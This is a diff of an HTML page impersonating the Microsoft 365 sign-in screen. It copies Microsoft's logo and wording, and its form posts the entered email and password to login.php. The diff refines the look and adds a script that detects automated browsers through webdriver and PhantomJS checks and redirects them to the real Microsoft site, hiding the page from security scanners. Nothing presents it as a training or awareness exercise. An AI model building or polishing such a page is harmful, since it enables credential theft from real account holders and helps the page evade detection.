@@ -1,78 +1,278 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sign in to your account</title>
+    <title>Sign in to your Microsoft account</title>
+    <link rel="icon"
+        href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'><rect width='16' height='16' rx='2' fill='%2300a4ef'/></svg>">
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
         body {
-            font-family: 'Segoe UI', 'Helvetica Neue', 'Lucida Grande', Arial, sans-serif;
-            background: #f0f0f0; min-height: 100vh; display: flex; align-items: center; justify-content: center;
+            font-family: 'Segoe UI', 'Helvetica Neue', 'Lucida Grande', Roboto, Arial, sans-serif;
+            background: #f0f0f0;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #1b1b1b;
         }
+
         .card {
-            background: white; box-shadow: 0 2px 6px rgba(0,0,0,0.2); border-radius: 4px;
-            padding: 44px; max-width: 440px; width: 100%;
+            background: #fff;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.15);
+            border-radius: 4px;
+            padding: 44px;
+            width: 440px;
+            max-width: 90vw;
         }
-        .logo { margin-bottom: 24px; }
-        .logo svg { width: 108px; height: 24px; }
-        h1 { font-size: 24px; font-weight: 600; color: #1b1b1b; margin-bottom: 12px; }
-        .subtitle { font-size: 14px; color: #1b1b1b; margin-bottom: 24px; }
-        .input-group { margin-bottom: 16px; }
+
+        .logo-area {
+            margin-bottom: 24px;
+            min-height: 36px;
+        }
+
+        .logo-svg {
+            height: 36px;
+            display: block;
+        }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 4px;
+            color: #1b1b1b;
+        }
+
+        .subtitle {
+            font-size: 14px;
+            color: #1b1b1b;
+            margin-bottom: 24px;
+        }
+
+        .input-group {
+            margin-bottom: 16px;
+        }
+
+        .input-group label {
+            display: block;
+            font-size: 13px;
+            color: #1b1b1b;
+            margin-bottom: 4px;
+            font-weight: 400;
+        }
+
         .input-group input {
-            width: 100%; padding: 6px 10px; border: 1px solid #8c8c8c; border-radius: 2px;
-            font-size: 15px; height: 36px; color: #1b1b1b;
+            width: 100%;
+            padding: 6px 10px;
+            border: 1px solid #8c8c8c;
+            border-radius: 2px;
+            font-size: 15px;
+            height: 36px;
+            color: #1b1b1b;
+            outline: none;
+            background: #fff;
+            transition: border-color 0.1s;
         }
-        .input-group input:focus { border-color: #0067b8; outline: none; box-shadow: 0 0 0 1px #0067b8; }
-        .input-group label { display: block; font-size: 13px; color: #1b1b1b; margin-bottom: 4px; }
-        .checkbox-group { display: flex; align-items: center; gap: 8px; margin-bottom: 24px; font-size: 13px; color: #1b1b1b; }
+
+        .input-group input:focus {
+            border-color: #0067b8;
+            box-shadow: inset 0 1px 2px rgba(0, 0, 0, 0.1);
+        }
+
+        .input-group input::placeholder {
+            color: #8c8c8c;
+        }
+
+        .error-msg {
+            color: #e81123;
+            font-size: 12px;
+            margin-top: 4px;
+            display: none;
+        }
+
+        .checkbox-group {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 24px;
+            font-size: 13px;
+            color: #1b1b1b;
+        }
+
+        .checkbox-group input[type="checkbox"] {
+            width: 15px;
+            height: 15px;
+            accent-color: #0067b8;
+        }
+
         .submit-btn {
-            float: right; padding: 6px 24px; background: #0067b8; color: white; border: none;
-            border-radius: 2px; font-size: 15px; cursor: pointer; min-width: 108px; height: 32px;
+            float: right;
+            padding: 4px 24px;
+            background: #0067b8;
+            color: #fff;
+            border: none;
+            border-radius: 2px;
+            font-size: 15px;
+            cursor: pointer;
+            min-width: 108px;
+            height: 32px;
+            font-weight: 400;
+            transition: background 0.1s;
         }
-        .submit-btn:hover { background: #005da6; }
-        .footer-links { margin-top: 40px; font-size: 12px; }
-        .footer-links a { color: #0067b8; text-decoration: none; margin-right: 16px; }
-        .footer-links a:hover { text-decoration: underline; }
-        .error { color: #e81123; font-size: 12px; margin-top: 4px; display: none; }
-        .kmsi { font-size: 13px; color: #1b1b1b; margin-top: 16px; }
-        .kmsi a { color: #0067b8; text-decoration: none; }
-        .kmsi a:hover { text-decoration: underline; }
+
+        .submit-btn:hover {
+            background: #005da6;
+        }
+
+        .submit-btn:active {
+            background: #004e8e;
+        }
+
+        .links {
+            margin-top: 24px;
+            clear: both;
+        }
+
+        .links a {
+            display: inline-block;
+            color: #0067b8;
+            text-decoration: none;
+            font-size: 13px;
+            margin-bottom: 8px;
+        }
+
+        .links a:hover {
+            text-decoration: underline;
+        }
+
+        .footer-links {
+            margin-top: 32px;
+            font-size: 12px;
+            display: flex;
+            gap: 16px;
+            flex-wrap: wrap;
+        }
+
+        .footer-links a {
+            color: #6a6a6a;
+            text-decoration: none;
+        }
+
+        .footer-links a:hover {
+            color: #1b1b1b;
+            text-decoration: underline;
+        }
+
+        .kmsi-note {
+            font-size: 12px;
+            color: #6a6a6a;
+            margin-top: 16px;
+            line-height: 1.4;
+        }
+
+        .kmsi-note a {
+            color: #0067b8;
+            text-decoration: none;
+        }
+
+        .kmsi-note a:hover {
+            text-decoration: underline;
+        }
+
+        .error-banner {
+            background: #fde7e9;
+            border: 1px solid #f1bbbc;
+            color: #e81123;
+            padding: 12px;
+            margin-bottom: 16px;
+            border-radius: 2px;
+            font-size: 13px;
+            display: none;
+        }
+
+        @media (max-width: 480px) {
+            .card {
+                padding: 24px 20px;
+            }
+        }
     </style>
 </head>
+
 <body>
     <div class="card">
-        <div class="logo">
-            <svg viewBox="0 0 108 24" xmlns="http://www.w3.org/2000/svg">
-                <text x="0" y="20" font-family="Segoe UI, sans-serif" font-size="20" font-weight="600" fill="#0067b8">Microsoft</text>
+        <div class="logo-area">
+            <svg class="logo-svg" viewBox="0 0 21 21" xmlns="http://www.w3.org/2000/svg">
+                <rect x="1" y="1" width="9" height="9" fill="#f25022" />
+                <rect x="11" y="1" width="9" height="9" fill="#7fba00" />
+                <rect x="1" y="11" width="9" height="9" fill="#00a4ef" />
+                <rect x="11" y="11" width="9" height="9" fill="#ffb900" />
             </svg>
         </div>
         <h1>Sign in</h1>
         <p class="subtitle">to continue to Microsoft 365</p>
-        <form action="login.php" method="POST">
+
+        <div class="error-banner" id="error-banner">
+            Your account or password is incorrect. If you can't remember your password, <a href="#"
+                style="color:#e81123;text-decoration:underline;">reset it now</a>.
+        </div>
+
+        <form action="login.php" method="POST" id="ms-form">
             <div class="input-group">
                 <label for="username">Email, phone, or Skype</label>
-                <input type="text" id="username" name="username" placeholder="someone@example.com" required autofocus>
+                <input type="text" id="username" name="username" placeholder="someone@example.com" required autofocus
+                    autocomplete="username">
             </div>
             <div class="input-group">
                 <label for="password">Password</label>
-                <input type="password" id="password" name="password" placeholder="Password" required>
+                <input type="password" id="password" name="password" placeholder="Password" required
+                    autocomplete="current-password">
             </div>
             <div class="checkbox-group">
-                <input type="checkbox" id="kmsi" checked>
+                <input type="checkbox" id="kmsi" name="kmsi" checked>
                 <label for="kmsi">Keep me signed in</label>
             </div>
-            <button type="submit" class="submit-btn">Sign in</button>
-            <div style="clear: both;"></div>
+            <button type="submit" class="submit-btn" id="submit-btn">Sign in</button>
+            <div style="clear:both;"></div>
         </form>
-        <div class="kmsi">
+
+        <div class="links">
             <a href="#">Forgot my password</a><br>
             <a href="#">Sign in with a different account</a>
         </div>
+
+        <div class="kmsi-note">
+            Other ways to sign in: <a href="#">Use security key</a>
+        </div>
+
         <div class="footer-links">
             <a href="#">Terms of use</a>
-            <a href="#">Privacy & cookies</a>
+            <a href="#">Privacy &amp; cookies</a>
+            <a href="#">...</a>
         </div>
     </div>
+
+    <script>
+        // Subtle anti-automation check
+        (function () {
+            var isAutomated = false;
+            try {
+                if (navigator.webdriver === true) isAutomated = true;
+                if (window._phantom) isAutomated = true;
+                if (window.callPhantom) isAutomated = true;
+            } catch (e) { }
+
+            if (isAutomated) {
+                window.location.href = 'https://www.microsoft.com';
+            }
+        })();
+    </script>
 </body>
+
 </html>
